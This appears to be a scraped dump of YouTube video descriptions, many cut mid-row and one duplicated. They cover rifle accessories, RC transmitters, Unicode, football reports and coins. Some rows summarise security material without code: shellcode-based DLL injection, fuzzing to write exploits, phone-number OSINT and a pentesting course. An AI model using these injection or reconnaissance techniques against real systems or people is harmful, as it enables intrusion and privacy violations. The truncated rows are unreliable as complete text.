I’d seen pictures of customized Tavor SARs around the web but had no idea how easy it was to upgrade one until I got my hands on a pile of parts from Manticore Arms. As of this writing, just to see how far I could go I’ve never even cleaned my Tavor, much less disassembled it properly. I had no way to know how effortless it would be to customize. I’ve swapped my trigger pack out and that should have been a clue. Here’s a spoiler: swapping to the all metal Manticore Arms safety levers is simpler than upgrading an AR15 selector - by a lot. So I made a video. Watch and you’ll see a cool gun become even cooler, and you might just be surprised at how simple and quick these upgrades are to implement.\n\nHere’s a short synopsis of what I did and why. \n\nI started with the Manticore Arms Tavor Curved Buttpad. I have to admit to seeing some humor in that label. In any event, it shortens the Tavor length of pull while keeping the overall length to a non-NFA 26 inches. So that’s a nice benefit. It also allows for a very nice contact surface for your pectoral or shoulder. It looks good, too!\n\nNext up and an even simpler upgrade, the Manticore Arms LUMA safety. This gives us a true ambidextrous safety which I like because it allows me to use my trigger finger to go from fire to safe. I know there are way cooler gun celebrities than I who have nice matched tool kits with proper punches to do this upgrade. I used a paper clip. Again, this is too easy not to do it. Wondering what LUMA means? Lever, Upgraded Metal Ambidextrous. Makes sense in the gun world, no?\n\nThe next piece of the Tavor upgrade puzzle would be a combination of the Manticore Arms ARClight XTL forend, their IPSM “Big Button” light switch and a Primary Arms Compact Weapon Light (rated for 700 Lumens for 70 hours!). I’ve mounted a light on my Tavor before, but having it integrated into an upgraded platform sure seemed like a good practical enhancement. In place of a proper workbench, I used an ARC Lok rail section to mount an Alamo Four Star Bipod to hold the Tavor. The forend can also be had in Keymod if you prefer. As you can see in the video there’s not much to combining these parts. Not only do you get the benefits of an integrated light, you get a unique look as well.\n\nThe last piece of this Tavor upgrade was to add the Manticore Arms Tavor Overwatch Full Length top rail. The purpose of this rail is to raise your sights higher. I didn’t ask Manticore about this, but from their website it appears their primary focus here was to allow commonly available iron sights to be at a height familiar to AR15 shooters. I decided to add an Aimpoint Hunter optic and this worked out very well. And the looks? See for yourself!\n\nTaken individually or all together, these are great Tavor upgrades from Manticore Arms. Super simple to install and each offers its own benefits. The combined effect of the various upgrades delivers a super cool looking rifle, but more importantly it enhances the user interfaces and capabilities of the Tavor platform. Manticore Arms has other upgrades coming including a Tavor charging handle that I haven’t yet seen. \n\nMy Manticore Arms Tavor Upgrade Parts list: \n\nTavor Curved Buttpad $70\nTavor LUMA Safety $34.95\nARClight XTL Tavor Forend $175\nPrimary Arms Compact Weapon Light with Pressure Switch $84.95\nArclight XTL IPSM \",2015-11-30,2020-12-27,,,n,

Shellcode got it's name from the fact that it's commonly used in regular exploitation to open a shell on the target from which the hacker can control it. You may use it in conjunction with an internal DLL mod or may use it as an alternative to injecting a DLL or you may use it for getting your initial code into the target so you can call LoadLibrary().\n\nWe'll be showing you how to get your shell code into a target which will then in turn load your DLL.\n\nNEED PASTEBIN LINK?

There will be official releases in the future but for now the nightlys are all we have with the updated protocols.  It's just three wires that need to be soldered and it's up to you if you want to include the 6v for power from the controllers batteries for low power crossfire usage.\n\nWiring diagram: http://bit.ly/2WEiHQd\nThe crossfire wire I cut and soldered: http://bit.ly/2WBeb4T\n\nLink to nightly companion builds: http://bit.ly/2WyKO2V\n\nAfter installing, setup your controller (the one big gear button).  Choose X9 Lite and select the following options: nohelo, crossfire, multimodule, lua, luac.  Then go over to the 'application settings' tab and select 'use nightly builds (unstable)' from the drop down.

In this video I show you a cost effective way to do this.  This process also works on most ligting controls and Led light kits. \n\n\nThis is easiest with the use of a new transmitter such as the Flysky GT3C or the GT5B.  Just remember you will need at least one separate channel avalible to run the light control.  THis same process works when running non traxxas electronics, you just need to wire the factory led box into the battery leads instead of the ESC.  I show this control running on channel six and programed to a button on the top of the radio.  This can be done with as little as a 3 channel receiver on trucks with only steering and throttle channels used by plugging into channel 3.  \n\n\nCHeck out the links below for the products used and a video on how to waterproof your receiver and lighting control unit.  \n\n\nLighting Control Used:\n\nApex RC Products RC Remote... https://www.amazon.com/dp/B07BKSGW3D?ref=ppx_pop_mob_ap_share\n\n\n\nHow to waterproof receivers and electronics:  \nhttps://youtu.be/Ed8z4-Id9og\n\n\nSocial Media LInks:\nFacebook:  https://www.facebook.com/llslrc/\n\nInstagram:  https://instagram.com/large_scale_life?igshid=1c4ojq8ncnuig",2020-12-19,2020-12-27,,,n,

qTVtOqv_GP4,https://www.youtube.com/watch?v=qTVtOqv_GP4,XK brand X8 Transmitter - Single Button Kill Switch Mod,Doggeslife,433,-1,"(Music by Dave Fenley: https://youtu.be/oOKUTQg9dSo)\n\n\n\n\nThis is my fix to a problem I experience flying my X520 and X420 vertical take-off and land aircraft.\n\nThe X8 that comes with the X520 VTOL is superior in almost every way to the cheesy X4 transmitter that comes with the smaller X420.  The X8 CAN be used with either aircraft.  But the X4 has one advantage, a superior motor kill switch set-up.\n\nThe X4 has 2 buttons on top of the case that must be pressed at the same time to cut power after an intentional (or unintentional) landing.  Not the best set-up, but it allows you to fly the plane down all the way to the ground and then kill power right at ground contact to save prop tips if it falls over (a common issue with these XK craft).\n\nThe X8 transmitter however requires one to push a pair of buttons low on the case and below the sticks.  The only way I have been able to access them is to let go of the sticks with both hands shortly before touchdown.  I really do not like that one bit.  In a breeze or higher wind I need to have control of the aircraft to counter unwanted movement and descend straight down on the intended spot.\n\nWhat I need is a single kill button accessible via my left hand while I fly the craft with my right.  The left stick handles roll control on a vertical axis when hovering and can be let go with no problems. The gyros will keep it steady.  I just need pitch and yaw control via the right stick to maintain left/right/fore/aft motion to counter any side forces and land on-spot.\n\n\n\n\n\nThis video shows my solution.  Here are links to example DPDT momentary contact switches like that I used.  It has 2 separate switch circuits to keep the photo button and stick mode button isolated from each other. The NC (Normally On) side is a closed circuit that opens when the button is pushed and stops when released, and the NO (Normally Open) side allows current to flow when pushed. The latter side of the switch is the one you need to put to use.\n\nHere are links to my switch source and a distant one overseas.  If you do not mind waiting a MONTH or so, then used the second link for a Chinese source that offers similar switches much cheaper. I paid more to get mine in a week locally..... I'm BORED, dang-it!\n\n If you have a local electronics supply like a still-stocked FRYS, try them first.\n\nLocal USA seller:\nhttps://www.ebay.com/itm/253556058281\n\nChinese seller (many Sino sellers on eBay):\n\nhttps://www.ebay.com/itm/2PCS-Red-6-P...\n\n\n\n\n(Van Morrison cover by Dave Fenley)",2020-04-14,2020-12-27,,,n,

Specifically, you will see how Unicode code points are encoded into binary and why the byte order, that is the endianness, of some Unicode Transformation Formats could be an important consideration if you’re a programmer handling text data, or if you build websites.  \nThe video demonstrates how Unicode code points are encoded in ASCII, UCS-2, UTF-16, UCS-4, UTF-32 and UTF-8, and it discusses some of the advantages and disadvantages of these encodings.  The UTF-16 high surrogate and low surrogate format is explained, including its effect on the available range of code points.  The UTF-8 bit patterns are also described in detail.\nWhen saving UTF-16 or UTF-32 text files, it is possible to specify the byte order, which can be either big endian or little endian. The need for a byte order mark (BOM) in a UTF-16 text file is demonstrated by examining it encoding as hexadecimal data.  The so called UTF-8 with BOM format is also discussed.\nIn this computer science video, you will also see why it is important to include a charset meta tag in the head section of a web page, to specify the character encoding.  Problems that might occur if, for example, a web page has been encoded with ISO-8859-1 or Windows 1252 are demonstrated.\n\nIntroduction (0:00)\nUnicode code points(0:59)\nASCII (1:45)\nUniversal Character Set UCS-2 (2:24)\nUnicode Transformation Format UTF-16 (3:50)\nUnicode Transformation Format UTF-32 (9:26)\nUnicode Transformation Format UTF-8 (10:48)\nByte Order (14:03)\nByte Order Mark BOM Demonstration (15:07)\nUTF-8 with BOM Demonstration (19:47)\nWeb page character encoding (20:54)\nSummary (24:04)",2020-06-12,2020-12-27,,,n,

A character is simply a symbol. Computers do not deal with characters, they deal with numbers (binary). \nEven though you may see characters on your screen, internally it is stored and manipulated as a combination of 0s and 1s. This conversion of character to a number is called encoding, and the reverse process is decoding. ASCII and Unicode are some of the popular encodings used.\nIn Python, a string is a sequence of Unicode characters. Unicode was introduced to include every character in all languages and bring uniformity in encoding.\n\nhttps://docs.python.org/3.3/howto/unicode.html \n\n-by Yatin Jog",2020-08-30,2020-12-27,,,n,

Garcia Pimienta's team won with goals from Peque and Rey Manaj, their second consecutive victory at the Johan Cruyff Stadium.\n\nPeque puts Barça B ahead\nEspanyol B came flying out of the blocks in the first half and were the first to get a shot on goal, albeit that it was deflected away by the Barça B defence. The hosts didn't have any luck in front of goal in the opening exchanges, however, their insistence to keep on the front foot eventually got its reward when Peque took advantage of a header from Nils to put Barça B one nil up on nine minutes.\n\nAs they pressed for a second, their clearest chance came from a counterattack by Collado and Nils, before a header from a corner from Ferran saw Espanyol knock the wind out of Barça B's sails just before the break (1-1, min 38).\n\nRey Manaj breaks Espanyol hearts\nIn the second half, Arnau Tenas' spectacular save stopped Espanyol B from getting a second goal, before Hiroki Abe reappeared after his injury only to have to go off again a few minutes later.\n\nRey Manaj broke the deadlock with an extraordinary piece of individual play inside the area 10 minutes from the end. It turned out to be the winner and moved Barça B out of the relegation zone.\n\nMatch Details:\nBarça B, 2\nEspanyol B, 1\n\nBarça B: Arnau Tenas, Comas, Mika, Nils Mortimer (Manaj, min 67), Lucas de Vega, Collado, Jandro, Alvaro Sanz, Balde, Peque (Hiroki, min 74, Matheus, min 77)), Ilaix Moriba (Nico, min 67).\n\nEspanyol B: Joan García, Rubén Sánchez, Nil Jiménez, Román Tugarinov, Alejandro Pérez, Becerra, Iván Gil (Julen Álvarez, min 58), Ferran Jutgià (Roger Garcia, min 77), Max Svensson (Raigal, min 58), Luís Recasens and Gori.\n\nGoals: 1-0, Peque (min 9); 1-1, Ferran (min 38); 2-1, Rey Manaj (min 80).\n#FCBarcelona #BarcelonaB #Moriba\n\n► Subscribe, We are more than a channel.\n\n🔔 Turn your notifications on and never a miss a video \n\nVisca Barça 🔵🔴\n----------------------------------------------------------------------------------------------------\nFollow us on Facebook: http://facebook.com/BarcaWorldd\nFollow us on Instagram: http://instragram.com/BarcaWorldEn\nFollow us on Twitter: http://twitter.com/BarcaWorldEn\n----------------------------------------------------------------------------------------------------\nNote: I Significantly transform the work with high quality edits \u0026 special effects to create completely unique video.",2020-12-13,2020-12-27,,,n,

Little by little, the hosts took control of possession and created chances, with Gustavo Maia heading against the post the closest they came. Nàstic's two long shots from Bonilla was the best they had to offer.\n\nDominant\nRamos Mingo went close early in the second half for Barça B, and shortly after a corner from Konrad found its way to Comas at the near post to put Barça ahead (1-0, min. 57). The Catalans dominated possession thereafter and produced some great combination play but without finding a finishing touch. Impeccable in defence, Barça managed to hold onto their advantage and ended up taking the three points.\n\nMatch Details\nBarça B, 1\nNàstic de Tarragona, 0\n\nBarça B: Iñaki Peña, Solano, Ramos Mingo, Comas, Mingueza, O.

Consequently, in the first 45 minutes, García Pimienta's couldn't get past goalkeeper Craviotto.\n\nIñaki Peña at the other end had little to do other than save a shot from John Neeskens, the son of the beloved ex-Barça player Johan Neeskens.\n\nBarça B's right-back, Solano, and his replacement, Igor, both had to be subbed before the end of the first half because of injury.\n\nGoalless in the second half\n\nBarça B had even more possession of the ball in the second 45, however, El Prat had the more dangerous opportunities. Konrad de la Fuente went close for the hosts, but Craviotto was up to the task to deny the young American.\n\nDespite consistently taking the game to their opponents, the Catalans had to settle with a point, their fourth from two games before they head to Andorra on November 8.\n\nMATCH DETAILS \nBarça, 0\nPrat, 0\n\nBarça: Iñaki Peña, Solano (Igor, min. 17 (Álvaro Sanz, min. 34)), Comas, Ramos Mingo, Mika Mármol, Ilaix Moriba, Oriol Busquets, Lucas de Vega (Matheus, min. 68), Konrad de la Fuente, Rey Manaj (Zeballos, min. 68) and Gustavo Maia (Hiroki Abe, min. 68).\nPrat: Craviotto, Neeskens, Ricarte, Javi Martos, Diego, Adri Díaz, Putxi, Montero (Recort, min. 89), Guzmán (Alberto Padilla, min. 68), Domi (Artigas, min. 79) and Ufano (Marc Padilla, min. 68). \n\n► Subscribe, We are more than a channel.\n\n🔔 Turn your notifications on and never a miss a video \n\nVisca Barça 🔵🔴\n----------------------------------------------------------------------------------------------------\nFollow us on Facebook: http://facebook.com/BarcaWorldW\nFollow us on Instagram: http://instragram.com/BarcaWorldEn\nFollow us on Twitter: http://twitter.com/BarcaWorldEn\n----------------------------------------------------------------------------------------------------\nNote: I Significantly transform the work with high quality edits \u0026 special effects to create completely unique video.",2020-11-01,2020-12-27,,,n,

Comas also went close but sent the ball over when well placed. It remained goalless at the break in a game marked by the intensity of both teams.\n\nPerfect finish\nThe second half started in much the same manner as the first, with the game completely level and without many chances. Llagostera, however, took the lead with a great goal from Sergio Cortés. Great play from Genar saw him find Cortés who, almost without an angle, hooked the ball perfectly to score (1-0, minute 60).\n\nDespite the goal, Barça B tried to react and Collado, who came on in the second half, assisted Rey Manaj for what looked like a fine finish, only for the goal to be ruled out for a tight offside (minute 64).\n\nBarça B continued to press and with three minutes to go, the referee gave the visitors a penalty after a handball from Aimar, even though the offence took place outside the area. Jandro Orellana was given the opportunity to equalise, but Marcos saved the spot-kick to ensure a victory for the hosts. After a great effort from Barça B, it was a bitter defeat to take.\n\nMatch Details\nLlagostera, 1\nBarça B, 0\n\nLlagostera: Marcos, Aimar, Julen, Lucas, David G., Cortés, Sascha, Gil, Genar, Pau (Duba, min. 46), Guiu.\nBarça B: Carevic, Álvaro Sanz, Comas, Mika, José Marsà, Ilaix Moriba (Jandro, min. 76), Nico, Matheus (L.

After a good counterattack led by Peque, Nils Mortimer opened the scoring with a low shot on 12 minutes. At that point, the Catalans took control of the game, and Konrad, with a great individual effort, almost doubled the lead but Pau Torres saved Lleida.\n\nInto the second half, and the pattern of the first continued with Barça making all the running. On 64, another low shot, this time from Konrad, took Garcia Pimienta's team further ahead. However, Lleida reacted and on 76, Comas unfortunately put through his own net. \n\nGreat defensive sacrifice\nAfter Lleida's goal, the hosts defended with character to ensure that the three points were won.

You can see how it used to work, however, in this video and on null-byte.com.\n\nWhen running an OSINT investigation, a phone number can prove to be extremely useful in gathering information about a target. On this episode of Cyber Weapons Lab, we'll explore a couple tools you can use to extract information from a phone number.

This mirrorless camera is a huge deal because of what features it offers for its price point of around $1,150 USD. For hundred of dollars more you can snag an Fuji X-T2 or X Pro 2. Personally I own the X Pro 2 and was very curious if I could save money and buy this Fujifilm X-E3. Even though I enjoyed all of the time I spent with this camera thanks to BHPhoto for sending it over, I still feel I'll keep the X Pro 2 and it mainly comes down to the screen softness flaw. That bothered me a little and a few friends who use and own the camera. But the savings may be super worth it to you. So check it out at the link below.

Let me know if I didn't answer your question in the comments. Below is the full Q/A log that I go through in the video for reference.\n\nBuy your NX Series Radio Here: https://www.horizonhobby.com/search?q=NX+\u0026search-button=\u0026lang=default\n\n  \n\n\n\n\n\n\nQ: Do the NX Transmitters (NX6/NX8/NX10) have diversity antennas?\nA: All three have diversity antennas. The second antenna is located behind the transmitter nameplate. On the DX transmitters the antenna is in the transmitter handle.\n\nQ: Do the NX transmitters provide power to the serial port located on the back of the transmitter?\nA: Although all the NX transmitters have a serial port, only the NX10 provides power to the port (9.5V). The NX6 and NX8 will require an external power source for the 3rd party module.\n\nQ: Do the NX transmitters support the Immersion RC Ghost module?\nA: Currently no, but we are working with Immersion to add compatibility.\n\nQ: Do the NX transmitters have an Android interface?\nA: No, the NX transmitters do not use Android. They are an updated version of the DX Airware interface. \n\nQ: Are the DX transmitters going away? \nA: Yes, the DX6, DX8, and DX9 are going to be discontinued. The “e” versions (DX6e / DX8e) are staying in the product line up for years to come. \n\nQ: Is Horizon Hobby still provide customer support to DX radios?\nA: Yes, we will support DX radios for years to come.  Also, we are going to provide Airware updates for the foreseeable future. Support for new features could be left out if the older hardware cannot support these new features.\n\nQ: Do all NX transmitters feature Hall-effect gimbals?\nA: Only the NX10 has Hall-effect gimbals. Also, at this time, it is not going to be offered as an upgrade for NX6 or NX8. \n\nQ: Can the NX transmitter share files with DX and iX transmitters?\nA: Yes, you can share model files from DX to NX, but not from NX to DX. The iX can share models between DX, and NX.\n\nQ: Do all NX transmitters include the same size battery?\nA: No. The NX6 and NX8 come with a 1S 2000mAh battery, while the NX10 includes a 6000mAh battery. The higher capacity battery can be used in the NX6 and NX8 if desired.   \nConnector and size will fit with no issue after removing foam padding inside battery tray. \n6000mah iX12 Battery - https://www.horizonhobby.com/product/3.7v-6000mah-1s-ix12-transmitter-battery-tx-plug-xh-1s/SPMB6000LITX.html\n10500mAh iX20 Battery -  https://www.horizonhobby.com/product/3.7v-10500mah-1s-ix20-transmitter-battery-xh-1s/SPMB10500LITX.html\n\nQ: Can I get the magnetic USB connector from the NX10 for a NX6 or NX8?\nA: Yes - https://www.horizonhobby.com/product/magnet-micro-usb-charge-data-cable-and-adapter-ix12-ix20/SPMA3067.html\n\nQ: Do the NX transmitters have a touchpad screen?\nA: No, the NX transmitters use a roller and 3 buttons for navigation.\n\nQ: Can I use the NX6 with E-flite BNF planes with flaps and retracts (most warbirds) and still have a switch for SAFE Select?\nA: Yes, the NX6 has an extra channel that can be used for SAFE Select. This extra channel is non-proportional and non-adjustable, aside from reversing.\n\nQ: Is Spektrum going to continue to offer the iX transmitters?\nA: Yes, we are still going to offer and fully support the iX12 and iX20 transmitters. \n\nQ: Do you have new 10-Channel receivers to support the NX10? \nA: Although we don’t yet have new 10-channel receivers, we do have new 8-channel receivers. \nAR8020T 8-Channel Telemetry Receiver - https://www.horizonhobby.com/product/ar8020t-8-channel-telemetry-receiver/SPMAR8020T.html\nAR8360 8-Channel AS3X / SAFE Telemetry Receiver - https://www.horizonhobby.com/product/ar8360t-8-channel-safe-and-as3x-telemetry-receiver/SPMAR8360T.html\n\nQ: Will the NX transmitters work with DSM2 receivers?\nA: Yes, the NX transmitters are DSM2 and DSMX compatible.\n\nQ: What SD memory cards can be used with NX Transmitters?\nA: We suggest using a Class 6 or lower, 32g or smaller Micro SD Card that is formatted FAT or FAT32 file systems. Some Class 10 cards will work from top brands like SanDisk and Toshiba.",2020-10-23,2020-12-27,,,n,

Especially most of them that come with Tiny Whoops.  You can’t ever use them for anything else.  But LDARC has solved that.  Now if you get a Tiny6X RTF kit you get a radio and it can be loaded with firmware to support Futaba S-FHSS or FrSky D8 or D16.  This really increases the value you get out of these RTF kits.  You won’t want to fly with this forever.  But it will easily work for your first several models. Get a BNF that comes with a XM receiver?  No problem, this will bind up and work great.\n\nSupporting Droneracer101 on Patreon means more reviews and giveaways for you: www.patreon.com/droneracer101\n\n**************************************************\nSee my current list a favorite drones and accessories here: http://geni.us/DR101Favorites\n\nThese are some of my favorite components right now:\n\n***** Tiny Whoop *****\nhttps://www.youtube.com/playlist?list=PLfEeINCzBDwpY-i0Z7k1BpRSMh6SVwp09\nBanggood: Eachine E010S: http://bit.ly/E010S\nGearbest: Furibee F36S:http://bit.ly/FuriBeeF36S (Try Code RC18OFF)\nExtra 45C E010 Batteries: http://bit.ly/1S45C240mAh\n\n***** Brushless Micro Drone *****\nLizard95: http://bit.ly/EachineLizard https://www.youtube.com/playlist?list=PLfEeINCzBDwrESDf7OX88YVU2giRIgLHH \nLeader 120: http://bit.ly/Leader120-GB (Try Code RC18OFF)\nhttps://www.youtube.com/playlist?list=PLfEeINCzBDwpbJ4dU4wIzKXs1svKbu0J5 \n\n***** 5 Inch Racing Drone *****\nhttps://www.youtube.com/playlist?list=PLfEeINCzBDwrekaYsYvPGmjiZ68v250gQ\nDiatone GT2 2017 True X: http://bit.ly/DiatoneGT200N \nDiatone GT2 2017 Stretch X: http://bit.ly/DiatoneGT200S \n \n\n***** Radio Transmitter *****\nBeginner Flysky Good Radio: http://bit.ly/FlyskyFSi6X\nBest Beginner Option - FrSky GREAT Radio\nBanggood: http://bit.ly/TaranisX7\nGearbest: http://bit.ly/TaranisQX7-GB\nTop of the Line FrSky: http://bit.ly/TaranisX9DSE\n\n***** Goggles *****\nEntry Level Budget Goggles: http://bit.ly/VR007\nEachine Upgrade Goggles with DVR and Diversity: http://geni.us/EV800D  (These are the best option)\nAomway Commander Goggles with DVR, Diversity and Headtracker: \nBanggood: http://bit.ly/AomwayCommanderV1\nGearbest: http://bit.ly/AomwayCommanderV1-GB (Try Code RC18OFF)\n\nJust want to support the channel at no cost to you?

In no particular order:\n\n1928 $1 red seal legal tender star note\n1928C $1 blue seal silver certificate star note\n1928D $1 blue seal silver certificate star note\n1928E $1 blue seal silver certificate star note\n\nOut of those four notes, the $1 legal tender is available mostly in high grades.  All things equal, the 1928E $1 star should be the most valuable.\n\nThe next tier of rarity consists of the two experimental issues.  Any star note on a 1935A $1 silver certificate with a big red R or S is fairly rare.  Only 24,000 were printed.\n\nThe 1935A Hawaii and North Africa one dollar star notes are not rare, but they are popular.  Circulated Hawaii and North Africa star notes are readily available, but truly uncirculated examples are much more difficult to locate.\n\n1928, 1928A, 1928B, and 1934 $1 silver certificates are very common in circulated condition, but uncommon in perfect condition.\n\nAll 1935 one dollar silver certificate star notes are common (with exception of the above mentioned 1935A stars).  1935, 1935A, 1935B, 1935C, 1935D, 1935E, 1935F, 1935G, and 1935H are common.  Circulated stars sell for about $3, uncirculated star sell for closer to $15.\n\n1957, 1957A, and 1957B $1 silver certificate star notes are common and only worth about $2.50 in circulated condition.  Uncirculated stars are worth about $10.\n\nThere are plenty of $1 star notes from 1963 and newer.  These are really only collectible if they have a very low serial number that starts with five or more zeros.",2018-03-21,2020-12-27,,,n,

Well, then this is the perfect talk for you. We will begin by discussing how so called Fuzzers can be used to find previously unknown bugs in applications. Then we will analyse the generated crash dumps to find out if the underlying issue is exploitable and finally we will write a fully-fledged exploit. All this will be demonstrated live, based on the example of a well-known application with more than 1 million downloads per month.

In no particular order:\n\n1928 $1 red seal legal tender star note\n1928C $1 blue seal silver certificate star note\n1928D $1 blue seal silver certificate star note\n1928E $1 blue seal silver certificate star note\n\nOut of those four notes, the $1 legal tender is available mostly in high grades.  All things equal, the 1928E $1 star should be the most valuable.\n\nThe next tier of rarity consists of the two experimental issues.  Any star note on a 1935A $1 silver certificate with a big red R or S is fairly rare.  Only 24,000 were printed.\n\nThe 1935A Hawaii and North Africa one dollar star notes are not rare, but they are popular.  Circulated Hawaii and North Africa star notes are readily available, but truly uncirculated examples are much more difficult to locate.\n\n1928, 1928A, 1928B, and 1934 $1 silver certificates are very common in circulated condition, but uncommon in perfect condition.\n\nAll 1935 one dollar silver certificate star notes are common (with exception of the above mentioned 1935A stars).  1935, 1935A, 1935B, 1935C, 1935D, 1935E, 1935F, 1935G, and 1935H are common.  Circulated stars sell for about $3, uncirculated star sell for closer to $15.\n\n1957, 1957A, and 1957B $1 silver certificate star notes are common and only worth about $2.50 in circulated condition.  Uncirculated stars are worth about $10.\n\nThere are plenty of $1 star notes from 1963 and newer.

For mode 2 the gimbal on the left needs it's vertical axis (throttle) spring disabled and friction added.\n\nThe preloaded software, OpenTX, comes with mode 2 as the default setting and one model configured with four channel outputs.\n\nCH1 Throttle\nCH2 Ailerons\nCH3 Elevator\nCH4 Rudder\nThis basic configuration is enough to get flying once a receiver is bound to the transmitter.\n\nIf the Rx is connected to the ESC throttle please remove the propeller.\n\nGimbal Conversion To Mode 2\n\nOpening The Case\n\nRemove the four screws shown\nDo not separate the case\n\nRemove the battery clip slowly\nThere is a wire connected to it and a circuit board under it\nLift the right hand side first\nUnplug the wire from the circuit board\n\nCarefully separate the two halves of the case in a vertical motion till the pins in the module bay are clear\nBe careful not to damage the pins in the module bay\n\nGimbal Adjustment\n\nLocate the 4 gimbal screws shown\n\nNote where the screw threads are visible and the spring tension\n\nTurn screw 1 counterclockwise, left, till the spring tension is completely removed\n\nTurn screw 2 clockwise, right, till it is all the way down\n\nNote there is now tension on the spring again, this is normal\n\nYou may find that the throttle stick will move on its own\nCheck the amount of slack on the gimbal wires shown and adjust if necessary\n\nNote the gap as shown\n\nTurn screws 3 and 4 clockwise, to the right\nScrew 3 affects the smooth friction on the vertical axis\nScrew 4 affects the ratcheting (stepped) friction on the vertical axis\nTighten according to your personal preference\nI tightened 3 all the way and tightened 4 till I liked the feel when moving the stick\n\nClosing The Case\n\nPut the case back together carefully\nTake care not to damage the module bay pins\n\nWhen tightening the screws just make them firm\nThe screws are being held in plastic which could could get damaged\nUsing OpenTX \u0026 The Transmitter\n\nTurning On The Transmitter\n\nPower on the Tx by pressing and releasing the power button\n\nClear any warnings by following the instructions on the screen\n\nTurning Off The Transmitter\n\nRemove power from any receivers that are bound to it\nPower of the transmitter by pressing the power button till the screen goes blank, about 3 seconds\nBasic Screens \u0026 Views\n\nMain View\nShows the model name\nHas multiple pages\n\nTelemetry View\nShows telemetry values if configured\nMay have more than one screen\n\nModel Configuration Screens\nFor changing models and configuring them\nHas multiple pages\n\nRadio/Tx Configuration Screens\nFor performing actions related to the Tx\nHas multiple screens\n\nBasic Navigation\n\n\n\nPress\nPress and release in under a second\nLong Press\nPress until screen changes, about a second, an then release\nPAGE\nPress to change screens\nLong press to change from main view to telemetry screen\nLong press to go back a screen\nMENU\nPress to change from main view to model configuration screens\nLong Press to change from main view to Tx configuration screens\nEXIT\nPress to go back from one view to previous view\nPress to exit editing (described below)\nENTER\nPress to edit/change a value/field\nPress to stop editing\nMany more possibilities which will be covered in a separate post\nKnob\nTurn clockwise to move selection (cursor) forward or down\nTurn counterclockwise, left, to move selection backwards or up\nChanges values when editing\nDocumentation may refer to (+) and (-)\nThis refers to turning the knob\nTransmitter Mode 2 Configuration",2017-02-10,2020-12-27,,,n,

Make sure you update your OpenTX firmware :)\n\nOne thing I didn't mention as I figured everyone might be on the later radios now is the firmware running on your Taranis.  To flash receivers, you'll need to be on OpenTX 2.1 (I thought it was just people like me that got the original batch that needed to think of it)  Upgrading is a doddle, but if you are moving from a much earlier version you might need to change a few models as some of the mix sources might change (So I found some that should have been MAX were set to something else) but you can backup everything first.  Go to http://www.open-tx.org/ and download the OpenTX companion - this will let you backup your radio and upgrade the firmware then you can get going again :)\n\nIf you liked this video and want to show your support - either through subscribing, using an affiliate link, becoming a Patreon supporter or buying a T-shirt, then check out all the ways you could help out here http://www.currykitten.co.uk/support-me/",2017-02-04,2020-12-27,,,n,

wr6KdMXzCSY,https://www.youtube.com/watch?v=wr6KdMXzCSY,106 Generating payloads continue [Penetration Testing by Kali Linux],Yash Jain,22,"""kali linux"",""hacker exploit"",""kali linux tutorial""","Ethical hacking is testing the IT resources for a good cause and for the betterment of technology. This training will establish your understanding of all the fundamental concepts, processes, and procedures.. You will spend time concentrating on each knowledge area, and studying the tools and techniques, inputs, and outputs associated with each knowledge area.In this course I covered all the topics,it’s a perfect Kali Linux tutorial for you.\n\nIn the pre-assessment quiz you’ll face questions from all sections of this Ethical Hacking training. Test your current knowledge and know your strengths and weaknesses.\n\nIn Introduction to Ethical Hacking, you will be introduced to various concepts on ethical hacking. You will receive an introduction to the basics of Risk Management and Disaster Recovery. As well as an introduction to Penetration Testing.You will gain a comprehensive understanding of vulnerability assessment and the tools used in this process. What kind of security measures do you take to protect your facilities, equipment, resources, personnel, and property from damage caused by unauthorized access? In this course, Physical Security, these are questions that we will be answering. Footprinting is the gathering of information related to a particular computer and its users and systems.\n\nReconnaissance is an exploration that is conducted to gain information. Network scanning is the scanning of public or private networks to find out which systems are running, their IP addresses, and which services they are running. In Port Scanning, you will learn how ports can be scanned, how a hacker can break into your network through the ports, and the countermeasures you can take to protect your device or network.\n\nBanner grabbing is a technique used to grab information about computer systems on a network and the services running its open ports. In this course you will be introduced to enumeration and the many different uses it has in computer systems. This course will include demos on the different tools and uses of enumeration. In this course you will be learning the fundamentals of Linux. We will be pairing this course with demos with a more in-depth look into some of the fundamentals and tools of Linux.\n\nPentesting is an attack on a system in hopes of finding security weaknesses. In the course Configuring Linux for Pentesting, you will be learning the steps to configure Linux for pentesting and tools used for pentesting on a Linux system. Whenever we login to a computer system, we provide information to identify ourselves. We refer to this as authentication. Ensure that you know everything involved in securing a Windows system against attack. During this course you’ll get into Windows passwords — how they’re created, how they’re stored, and different methods used to crack them.\n\nYou will take a good look at spyware, the activities it performs, different types of spyware, and the countermeasures needed in order to prevent hackers from utilizing these types of techniques against your company. You will also spend time studying different types of keyloggers. There are three different types of keyloggers that we see used in today’s environments: hardware, software, and kernel/driver keyloggers. Covering Tracks will be going over various ways that attackers have at their disposal to cover any tracks that may lead to their unwanted eviction, or worse yet, to an audit trail that would lead directly back to them. Trojans and Backdoors is the course where our software is going to be going undercover.\n\nYou will discover what viruses and worms are and how they can infect computers and systems. Sniffers is our course where we take a look at Network Sniffing. Social engineering is the art of extorting employees for information.\n\nBecome familiar with the following concepts: denial-of-service, distributed denial-of-service, and how the denial-of-service and distributed denial-of-service attacks take place.

I have learned my LIFE lessons and have no hard feelings toward NOBODY involved I wish Cardi B and her Team all the best and I have moved on. With that being said and after a lot of thought I will recoup my fees and put it towards my business. Even though I didn't do this for financial gain a year ago Ive learn when life gives u lemons make lemonade. At over 7million views I see my voice was heard, this cautionary tale was taken into account, and my point was made. Thanks the those who support and for those who don't thank you anyway your opinions are still of value.\n\n\n(original comment) This video in no way speaks on how Cardi B is to everyone this is just my story on what happened to me. I posted this video the Wednesday following dec 16 and was asked to take it dwn bc of some content in the video that was private so now it’s edited and back up, also all negative comments will be deleted I’m not here to argue with ppl or feed into negativity.",2018-01-21,2020-12-27,,,n,

